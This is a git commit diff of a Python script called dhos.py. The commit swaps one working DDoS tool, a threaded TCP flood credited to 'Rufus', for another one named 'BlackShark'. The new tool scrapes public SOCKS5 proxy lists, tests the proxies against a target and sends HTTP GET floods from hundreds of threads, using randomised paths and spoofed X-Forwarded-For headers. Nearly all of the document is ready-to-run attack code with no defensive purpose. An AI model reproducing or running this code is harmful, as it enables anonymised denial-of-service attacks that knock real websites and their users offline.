72528c4d0da2db5f2288d4d650b3cc132fd0399d
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-03 17:54:04 +0300

    Update dhos.py

--- dhos.py
+++ dhos.py
@@ -28,162 +28,166 @@ os.system("clear")
 print('''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''')
 print("DDos python script")
 
-import socket
+import socks 
+import socket 
+import requests 
+import threading 
+import random 
+import ssl 
+import os
+import sys
+import time
+from colorama import Fore
 
-from threading import Thread
+nums = 0
+os.system("clear")
+print(Fore.CYAN+"\n             '||` '||`                                      ")
+print(Fore.CYAN+"              ||   ||                                       ")
+print(Fore.CYAN+".|'', .|''|,  ||   ||   '''|.  '||''|, (''''  '''|.  '||''| ")
+print(Fore.CYAN+"||    ||  ||  ||   ||  .|''||   ||  ||  `'') .|''||   ||    ")
+print(Fore.BLUE+"`|..' `|..|' .||. .||. `|..||.  ||..|' `...' `|..||. .||.   ")
+print(Fore.BLUE+"                                ||                          ")
+print(Fore.BLUE+"                               .||         "+Fore.RESET)
+print(Fore.RED + "Code By Zero_BlackShark - 2021/09/19")
+print(" ")
+print("Version 2.0  https://github.com/ZeroBlackShark/DDoS_BlackShark\n") 
 
-from pystyle import Colorate, Center, Write, Anime, Colors, System, Col
+time.sleep(1)
+print (Fore.BLUE+"> BlackShark offical")
+time.sleep(1)
+print (Fore.BLUE+"> Current build: 2.0")
+time.sleep(3)
+print (Fore.GREEN+"> Coded by Zero_BlackShark")
+time.sleep(2)
+print (Fore.BLUE+"> BlackShark Members:")
+print (Fore.CYAN+">>>Zero_BlackShark")
+print (Fore.CYAN+">>>One_BlackShark")
+print (Fore.CYAN+">>>Three_BlackShark")
+print (Fore.BLUE+"_________________________________")
+time.sleep(1)
+print ("")
 
-
-__license__ = "This code has been developped by billythegoat356, and has been uploaded on https://github.com/billythegoat356/Rufus"
-
-
-
-
-
-class Rufus:
-    def check_port(ip: str, port: int) -> bool:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
-
-            addr = (ip, port)
-            check = sock.connect_ex(addr)
-            sock.close()
-
-            return not check
-        except:
-            return False
-
-    def dos(ip: str, port: int, th: int):
-        global n
-        n = 1
-        for i in range(th):
-            Thread(target=Rufus._dos, args=[ip, port]).start()
-            print(Colorate.Horizontal(Colors.blue_to_red, f"Creating thread number {i + 1}..."))
-
-
-    def _dos(ip: str, port: int):
-        global n
-        
-        while True:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                addr = (ip, port)
-                sock.connect_ex(addr)
-                print(Colorate.Horizontal(Colors.blue_to_red, f"Initializing connection number {n}..."))
-                n += 1
-                sock.send(b'Rufus Here -> https://github.com/billythegoat356/Rufus\n'*1024)
-                print(Colorate.Horizontal(Colors.blue_to_red, f"Sending 1024 bytes to {ip}:{port}..."))
-            except:
-                print(Colorate.Horizontal(Colors.red_to_blue, "Error! Connection refused."))
-                
-        
-
-banner = r"""
-                                                              ```.......`                
-                                                     `.-:/oosyyhmmdhhyyhdmy`              
-                                               `-:+shdmmNNNmdhyo/-...` `-sM-              
-                                          `.:ohmNMMMMNNdho:-``   `+s/     h`              
-                                       .:sdNMMMMMMNNy/-`         `-`     .o               
-                                   `.+hNMMMMMMNdsd+o`                   +s`               
-                                 .+ymNMMMMMNyo/:...   `..````          `+.                
-                               :ydmNMMMMNy:`      ..-/osshsyhso/.`-.   --                 
-            ommmhyyyso/-`   `+dddMMMMMh/`       `/ssmoyh.m:+m`omyh:-+ .:                  
-             oMMMMmhys/yMm/omhdMMMMNs.       `/yyddhMNMMNMmMmoN-.yd+`o:                   
-              -dMMMMMN+mdyNhhMMMmd+`     .-:oyddNMMMMMMMMMMMMMNyd:+s::                    
-               `hMMMMyNymhyNMNMN+`     `/+oyhsssdohydMdMMMMMMMMMNd//.                     
-                `mMMMmdmsdMMMoy.       /yhssysssyhdyds+h/MMMMMMms/`                       
-                 oMMMMdsNMMMMh:.       ``-..``   `-:oyhooo:NMMs.                          
-                 /MMMdhMMMdd-hs:                   `./ooyooso+                            
-                 sMMNmMMMMy:``+s-                     .oo+ho-                             
-                `mMMMMMMmdsy/` .//                      :y/h                              
-                /MMMMMMMy: .+o/`                        `o+-                              
-                dMMMMMMNsy/`  .`                ./. `.- `                                 
-               .MhNMMMM+ `-/:                 -o/``:-`                                    
-               oN:mMNMd                     `+/`.//`                                      
-               dh+mNhN:                    -+``sN/                                        
-              -NyymNmm                    -- +NMMy.                                       
-             .dMhdNNNh .                 -.-dMMMMNms.                                     
-            :mMMmmMMMh :                ``/hNMMMMMMMNy-                                   
-           oNMMMMmMMMd /                 +mhMMMMMMMMMMNs`                                 
-         .yMMMMMMMMMMN`o                /dyMMMMMMMMMMMMMd-                                
-        -mMMMMMMdNMMMM//-             `.ymdmmmNNNNMMMMMMMm.                               
-       /NMMMMMMdNyNMMMd`+            .`y+-+ooooosyhdmmmNNMy          `-/syhy:             
-      +NMMMMMMMNoNsdMMMs.:           :`N:          `.-/ohdM`      ./ymmmmmy-              
-     +MMMMMMMMMMyoMysNMMo--          :`M/               `/m-   `/ymNmhdds.                
-    /NmmNmmmmmmyyyNN/-hMMs-.         --yy                 .` -smMNdsymo-                  
-   -dmmmmmmmsshds/-`   :dMd:`        .s:m/                `:hMMMMhodh-                    
-  `dNNNNNNhyho-          :yNh-     `:ds:oNo.`           `+dMMMMN++Ny`                     
-  sMMMMMMmd/               `+hh/`   `:   +MNho+//+syo .sNMMMMNs.+M+                       
- .MMMMMMm/                    `/ss+.      -dMMMMMMmdddMMMMMds+sNM/                        
- sMMMMNo`                         .://:-`   :hNMMMMMMMMMMNmNMMMM+                         
- mMMMy.                               ``.-..``.:sdMMMMMMMMMMMMMh                          
--MMh:                                            `-omMMMMMMMMMN.                          
-/d/`                                                `/dddMMMMMo                           
-``                                                    `sdhMMMN.                           
-                                                        +ddNNy                            
-                                                         :hdm/                            
-                                                          /md`                            
-                                                           .-"""[1:]
-
-
-
-ascii = """\n\n
-ooooooooo.                .o88o.                      
-`888   `Y88.              888 `"                      
- 888   .d88' oooo  oooo  o888oo  oooo  oooo   .oooo.o 
- 888ooo88P'  `888  `888   888    `888  `888  d88(  "8 
- 888`88b.     888   888   888     888   888  `"Y88b.  
- 888  `88b.   888   888   888     888   888  o.  )88b 
-o888o  o888o  `V88V"V8P' o888o    `V88V"V8P' 8""888P'\n\n"""
-
-
-
-def tui():
-    System.Clear()
-    print(Colorate.Horizontal(Colors.blue_to_red, Center.XCenter(ascii)))
-
-def main():
-    System.Title("Rufus - by billythegoat356")
-    System.Size(170, 55)
-    Anime.Fade(Center.Center(banner), Colors.blue_to_red, Colorate.Vertical, interval=0.01, enter=True)
-
-    tui()
-
-    ip = Write.Input("Enter the IP address -> ", Colors.blue_to_red, interval=0.005)
-
-    port = Write.Input("Enter the port -> ", Colors.blue_to_red, interval=0.005)
-
-    print()
-
+def checking_socks(lines,):
+    global nums
     try:
-        port = int(port)
-    except ValueError:
-        Colorate.Error("Please enter a valid port!", wait=True)
-
-    th = Write.Input("Enter threads (press enter for 1000) -> ", Colors.blue_to_red, interval=0.005)
-    if not th: th = '1000'
-
-    try:
-        th = int(th)
-    except ValueError:
-        Colorate.Error("\nPlease enter a valid threads number!", wait=True)
-
-
-    print('\n')
-
-    if Rufus.check_port(ip, port):
-        input(Col.cyan + f"{ip}:{port}" + Colorate.Horizontal(Colors.red_to_blue, " is opened! Press enter to start the attack..."))
+        proxy = lines.strip().split(":")
+        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+    except:
+        lsts.remove(lines)
+        return
+    err = 0
+    if port == 443:
+        ms = 5
     else:
-        input(Col.cyan + f"{ip}:{port}" + Col.red + " is closed or doesn't respond. Cannot start the attack.")
+        ms = 5
+    while True:
+        if err == 3:
+            lsts.remove(lines)
+            break
+        try:
+            s = socks.socksocket()
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+            s.settimeout(ms)
+            s.connect((str(host), int(port)))
+            if port==443:
+                ctx = ssl.SSLContext()
+                s = ctx.wrap_socket(s,server_hostname=host)
+            s.send(str.encode("GET / HTTP/1.1\r\nHost: "+host+"\r\n\r\n"))
+            s.close()
+            break
+        except:
+            s.close()
+            err +=1
+    nums += 1
+
+def check_socks():
+    global nums
+    thread_list=[]
+    for lines in list(lsts):
+        pro = lines.strip().split(":")
+        th = threading.Thread(target=checking_socks,args=(lines,))
+        th.start()
+        thread_list.append(th)
+        time.sleep(0.01)
+        sys.stdout.write(Fore.YELLOW+"Checking "+Fore.CYAN+"["+Fore.WHITE+str(pro[0])+Fore.CYAN+"]-["+Fore.GREEN+"Connected"+Fore.CYAN+"] \n"+Fore.YELLOW+"Number "+Fore.CYAN+"["+Fore.WHITE+str(nums)+Fore.CYAN+"] \r"+Fore.RESET)
+        sys.stdout.flush()
+    for th in list(thread_list):
+        th.join()
+        sys.stdout.write(Fore.YELLOW+"Checking "+Fore.CYAN+"["+Fore.WHITE+str(pro[0])+Fore.CYAN+"]-["+Fore.GREEN+"Connected"+Fore.CYAN+"] \n"+Fore.YELLOW+"Number "+Fore.CYAN+"["+Fore.WHITE+str(nums)+Fore.CYAN+"] \r"+Fore.RESET)
+        sys.stdout.flush()
+    print("\r\nChecked all lsts, Total Worked:"+str(len(lsts)))
+    with open("socks5.txt", 'wb') as fp:
+        for lines in list(lsts):
+            fp.write(bytes(lines,encoding='utf8'))
+    fp.close()
+    os.system("cat socks5.txt|sort -u -n -o socks5.txt")
+
+def clone(): #Get Socks5 List
+    f = open("socks5.txt","wb")
+    try:
+        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all",timeout=5)
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
+        f.write(r.content)
+        f.close()
+    except:
+        f.close()
+    os.system("cat socks5.txt|sort -u -n -o socks5.txt")
+
+def atk(): #Socks Sent Requests
+    proxy = random.choice(lsts).strip().split(":")
+    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]))
+    while 1:
+        try:
+            s = socks.socksocket()
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+            s.connect((str(host), int(port)))
+            try:
+                for _ in range(per):
+                    s.send(str("GET "+uu+"?="+str(random.randint(1,210000000))+" HTTP/1.1\r\nHost: "+host+"\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n").encode())
+                    s.send(str("GET "+uu+"?="+str(random.randint(1,210000000))+" HTTP/1.1\r\nHost: "+host+"\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n").encode())
+                print(Fore.CYAN + "ChallengeCollapsar From ~[" + Fore.WHITE + str(proxy[0])+":"+str(proxy[1])+ Fore.CYAN + "]") #Code By GogoZin
+            except:
+                s.close()
+                #print(Fore.RED+"Connection Error")
+        except:
+            s.close()
+            #print(Fore.RED+"Canʼt Connect To Socks")
+
+if __name__=='__main__':
+    host = str(input('Target (Ex. www.google.com ) : '))
+    if host =='':
+        input("Error Input ! Try Again")
         exit()
-    
-    tui()
-
-    Rufus.dos(ip=ip, port=port, th=th)
-
-
-
-if __name__ == '__main__':
-    main()
+    port = str(input('Port (Default Is 80) : '))
+    if port =='':
+        port = int(80)
+    thr = str(input("Threads (1-800 Default Is 300) : "))
+    if thr =='':
+        thr = int(300)
+    else:
+        thr = int(thr)
+    per = str(input("CC-Power (1-100 Default Is 70) : "))
+    if per =='':
+        per = int(70)
+    else:
+        per = int(per)
+    uu = str(input("Path (Default Is / ) : "))
+    if uu=='':
+        uu ='/'
+    gt = str(input('Get List? (y/n) : '))
+    if gt =='y':
+        clone()
+    else:
+        pass
+    lst = str(input('Socks5 List (socks5.txt) : '))
+    if lst =='':
+        lst = 'socks5.txt'
+    lsts = open(lst).readlines()
+    check_socks()
+    print('Total Socks5 -> %d'%len(lsts))
+    for _ in range(thr):
+        threading.Thread(target=atk).start()
